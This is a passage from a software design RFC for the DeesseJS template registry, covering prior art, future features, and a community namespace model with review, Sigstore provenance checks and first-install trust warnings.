Sources: [shadcn registry getting started](https://ui.shadcn.com/docs/registry/getting-started), [shadcn `registry-item.json` schema](https://ui.shadcn.com/docs/registry/registry-item-json), [shadcn `components.json` schema](https://ui.shadcn.com/docs/components-json).

### Nuxt

Nuxt's `components/` directory auto-import pattern is the inspiration for the `paths{}` block in `deesse.json` (per [RFC-001](./RFC-001-deesse-json)). Nuxt modules (`@nuxtjs/auth`, `@nuxtjs/tailwindcss`) ship via npm and integrate via `defineNuxtModule`; DeesseJS items ship via the registry CDN and integrate via `deessejs add` (per [RFC-003](./RFC-003-deessejs-add)). Both share the "registry of opinionated pieces" model.

Sources: [Nuxt components directory](https://nuxt.com/docs/4.x/directory-structure/app/components), [Nuxt auto-imports](https://nuxt.com/docs/4.x/guide/concepts/auto-imports).

### Rails generators

`bin/rails generate authentication` (Rails 8) and `rails generate devise:install` are the inspiration for the "scaffold a complete feature into an existing project" model. `deessejs init` is a Rails-style scaffold for full apps; `deessejs add` is a Rails-style overlay for features.

Sources: [Rails generators guide](https://guides.rubyonrails.org/generators.html), [Rails 8 authentication generator](https://andriifurmanets.com/blogs/built-in-authentication-in-rails), [Devise setup](https://www.digitalocean.com/community/tutorials/how-to-set-up-user-authentication-in-a-rails-7-application).

### npm registry

The "hundreds of internal templates" scale is the npm-registry model, not the shadcn-community model. The author tooling (`deessejs template <validate | new | explain>`) is the npm-registry tooling model (one repo, one `registry.json`, validation in CI). The static CDN at `registry.deessejs.dev` is the npm-registry CDN model.

Sources: [Spotify Engineering: When Should I Write an ADR](https://engineering.atspotify.com/2020/04/when-should-i-write-an-architecture-decision-record) (naming and structure), [Rust RFC process](https://github.com/rust-lang/rfcs) (the numerical RFC prefix and the Prior Art section).

## Future Possibilities

This RFC documents the scope of the change set. The following possibilities are **explicitly out of scope** but worth flagging for future ADRs.

- **Private registry items behind auth.** A separate CDN (e.g. `private.registry.deessejs.dev`) gated by the existing `auth.*` oRPC procedures. Requires extending the transport discipline to allow authenticated `fetch`. The public CDN at `registry.deessejs.dev` stays auth-free by design; private items live on the private CDN. Likely coupled with the PRO namespace business model.
- **A web UI for non-technical template authors.** A page at `deessejs.com/templates/new` that edits a `deesse-template.json` via a form, validates against the published schema (Zod via `zod-to-json-schema`), and commits directly via GitHub OAuth. Model: `ui.shadcn.com/create`. Likely coupled with the PRO namespace business model.
- **A `deessejs build` command** that compiles TSX sources into `deesse-template.json`. Useful only if multi-style templates (one repo ships several variants) or code generation become real use cases.
- **Auto-discovery of namespaces from a public repo's `registry.json`.** Gated on `--discover` opt-in with explicit rate-limit handling (cached `HEAD` requests, ETag revalidation, user-prompted probe). Useful for users who want to install items from a registry they have not pre-declared in `deesse.json#registries`.
- **A `Project` Zod schema counterpart for `deesse.json`** with the same JSDoc treatment as `TemplateV2`. Today the `Project` schema exists in `@workspace/contracts/src/v1/project.ts` but lacks the JSDoc contract. A `deessejs project explain` namespace could mirror the `template` namespace (per [RFC-004](./RFC-004-template-author-tooling)).

### Community support

This contract supports **third-party community templates and features** without changes to `deesse-template.json` or the CLI command surface. The user opts in to a registry by adding an entry to `deesse.json#registries` (per [RFC-001](./RFC-001-deesse-json)); the CLI fetches items from any registry the user has declared.

**Two-tier namespace model.** Items in the ecosystem live in one of two namespace tiers, distinguished by their `deesse.json#registries` host and the namespace prefix in their `name`:

| Namespace prefix | Tier | Vetting | Discovery |
|---|---|---|---|
| `@deessejs/...` | Official | Reviewed and published by the DeesseJS core team. Lives on `registry.deessejs.dev`. | Default; no opt-in needed. |
| `@deessejs-community/...` | Curated community | Mandatory review by a DeesseJS maintainer via a GitHub PR against `deessejs/community-registry` (a centralised registry repo that re-publishes curated items to `registry.deessejs.dev/community/`). | Default; no opt-in needed. |
| `@<host>/...` | Open community | No vetting. Lives on the author's own registry (declared in the user's `deesse.json#registries`). | Opt-in per host; the user adds `"@<host>": "https://<host>/r/{name}.json"` to their registries map. |

The `@deessejs-community/...` tier is **mandatory-reviewed**: an author cannot self-publish to this namespace. A PR against `deessejs/community-registry` is reviewed for code quality, security (no `postinstall` scripts in transitive dependencies, no obvious supply-chain risk), license compatibility, and adherence to the `deesse-template.json` schema. Only after a maintainer approves the PR is the item published to `registry.deessejs.dev/community/<slug>.json` and made installable.

**Provenance verification (Sigstore + OIDC, opt-in).** Items in any tier may carry a `provenance` field in `deesse-template.json` that ties the published descriptor to a specific GitHub commit via Sigstore-signed attestation (inspired by [npm provenance](https://github.blog/security/supply-chain-security/introducing-npm-package-provenance/) and SLSA). Shape:

```jsonc
{
  "provenance": {
    "type": "sigstore",
    "repository": "github.com/user/my-deesse-template",
    "ref": "refs/tags/v1.4.0",
    "commit_sha": "abc123...",
    "attestation": {
      "mediaType": "application/vnd.dev.sigstore.bundle+json",
      "bundle": "<base64-encoded Sigstore bundle>"
    }
  }
}
```

The CLI's verification is **opt-in** (per `--verify-provenance` flag, default off to keep the initial install flow simple). When on, the CLI fetches the Sigstore bundle, verifies the signature against the Fulcio root, checks the inclusion promise against the rekor log, and asserts the `commit_sha` matches the `source.ref` in the descriptor. A failed verification emits a loud warning but does **not** block the install (per the npm pattern — provenance is informational, not gating). Future versions may make verification default-on for `@deessejs-community` items.

**Distribution model.** Each author maintains their own GitHub repo (this contract requires `deesse-template.json` at the root). The author's CI publishes a tarball to their own host (or uses GitHub's `codeload` archive endpoint as a default). The user's `deesse.json#registries` entry points at the author's host URL. There is no centralised registry repo that authors must PR against (except for `@deessejs-community` items, which go through `deessejs/community-registry`).

**Trust warnings (already shipped in [ADR-032 §Hook runner safety rules](/decisions/ADR-032-deesse-template.json)).** The CLI surfaces a one-time trust warning at first install from an unfamiliar host:

```
Warning: this template installs untrusted dependencies.
The package manager will run lifecycle scripts (preinstall, install, postinstall) for each one.
Continue? [y/N]
```

`@deessejs/` items never show the warning. `@deessejs-community/` items never show it (the namespace is the vouch). `@<host>/` items always show it on first install from that host; the `--trust-host=<host>` flag suppresses subsequent warnings from the same host.

**Future considerations** (out of scope for this RFC, may land in follow-up ADRs):

- **`deessejs community submit`** — a CLI command that scaffolds a PR against `deessejs/community-registry` from a local `deesse-template.json` (analogous to `npm publish` but submitting to a curated namespace).
- **Reviewer rotation** — a documented process for assigning `@deessejs-community` PRs to maintainers, with a turnaround SLA.
- **Sign-and-publish OIDC** — the author's CI uses Sigstore's OIDC signing against GitHub Actions to attest the `commit_sha` automatically; the provenance field is auto-populated by the CI, not hand-written.
- **Per-tier search UX** — the gallery (`apps/web/src/app/(product)/templates/`) filters by namespace tier with distinct badges ("Official", "Community", "Verified").
- **De-publication** — a tier-aware de-publication flow (an item removed from `@deessejs-community` becomes `@<host>/...` on the author's own registry; an item removed from `@deessejs/` is gone everywhere).
- **Anti-impersonation** — a `deessejs template validate --strict` check that verifies the `source.repo` matches the GitHub org whose OIDC token signed the provenance (catches typosquats like `@deessejs-community/saas-startr`).
